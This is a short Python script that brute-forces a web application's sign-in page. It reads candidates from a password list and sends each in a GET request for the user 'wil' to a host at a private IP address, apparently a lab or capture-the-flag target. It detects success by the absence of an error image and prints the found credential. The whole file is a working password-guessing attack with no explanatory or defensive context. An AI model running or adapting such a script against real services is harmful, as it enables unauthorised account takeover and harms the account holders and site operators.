import requests




error_message = "images/WrongAnswer.gif"

try:
    with open("passwordlist.txt", 'r') as f:
        for password in f:
            url = f"http://10.18.125.219:8000/index.php?page=signin&username=wil&password={password.strip()}&Login=Login"
            # print(f"Trying {line}")
            # print(path)
            try:
                req = requests.get(url)
                if error_message not in req.text:
                    print(f"CREDENTIAL FOUND! will:{password.strip()}")
                    exit()
                else:
                    print(f"WRONG: {password.strip()}")
            except Exception as e:
                print(str(e))
    f.close()
except:
    print("Error")

print("Scan Complete")